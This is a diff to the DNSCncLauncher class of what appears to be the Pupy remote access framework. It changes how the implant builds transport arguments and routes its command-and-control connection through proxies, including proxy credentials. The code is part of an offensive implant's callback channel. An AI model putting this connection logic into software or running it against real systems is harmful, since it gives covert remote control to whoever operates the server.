@@ -249,13 +249,21 @@ class DNSCncLauncher(BaseLauncher):
             bind_payload=self.connect_on_bind_payload
         )
 
+        transport_args = {
+            k:v for k,v in t.client_transport_kwargs.iteritems()
+        }
+
+        transport_args['host'] = '{}{}'.format(
+            self.host, ':{}'.format(self.port) if self.port != 80 else ''
+        )
+
         client = t.client()
         s = None
         stream = None
 
         try:
             s = client.connect(host, port)
-            stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
+            stream = t.stream(s, t.client_transport, transport_args)
         except socket.error as e:
             logger.error('Couldn\'t connect to %s:%s transport: %s: %s',
                 host, port, transport, e)
@@ -277,12 +285,21 @@ class DNSCncLauncher(BaseLauncher):
                 bind_payload=self.connect_on_bind_payload
             )
 
-            if t.client is PupyTCPClient:
-                t.client = PupyProxifiedTCPClient
-            elif t.client is PupySSLClient:
-                t.client = PupyProxifiedSSLClient
-            else:
-                return
+            transport_args = {
+                k:v for k,v in t.client_transport_kwargs.iteritems()
+            }
+
+            transport_args['host'] = '{}{}'.format(
+                host, ':{}'.format(port) if port != 80 else ''
+            )
+
+            if proxy_type.upper() not in t.internal_proxy_impl:
+                if t.client is PupyTCPClient:
+                    t.client = PupyProxifiedTCPClient
+                elif t.client is PupySSLClient:
+                    t.client = PupyProxifiedSSLClient
+                else:
+                    return
 
             s = None
             stream = None
@@ -290,17 +307,29 @@ class DNSCncLauncher(BaseLauncher):
             proxy_addr, proxy_port = proxy.rsplit(':', 1)
             proxy_port = int(proxy_port)
 
+            transport_args['proxy'] = True
+
+            if proxy_password or proxy_username:
+                transport_args['auth'] = (proxy_username, proxy_password)
+
+            transport_args['connect'] = host, port
+
             try:
-                client = t.client(
-                    proxy_type=proxy_type.upper(),
-                    proxy_addr=proxy_addr,
-                    proxy_port=proxy_port,
-                    proxy_username=proxy_username,
-                    proxy_password=proxy_password
-                )
+                if proxy_type.upper() not in t.internal_proxy_impl:
+                    client = t.client(
+                        proxy_type=proxy_type.upper(),
+                        proxy_addr=proxy_addr,
+                        proxy_port=proxy_port,
+                        proxy_username=proxy_username,
+                        proxy_password=proxy_password
+                    )
+                else:
+                    client = t.client()
+                    host = proxy_addr
+                    port = proxy_port
 
                 s = client.connect(host, port)
-                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
+                stream = t.stream(s, t.client_transport, transport_args)
 
             except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
                 if proxy_username and proxy_password:
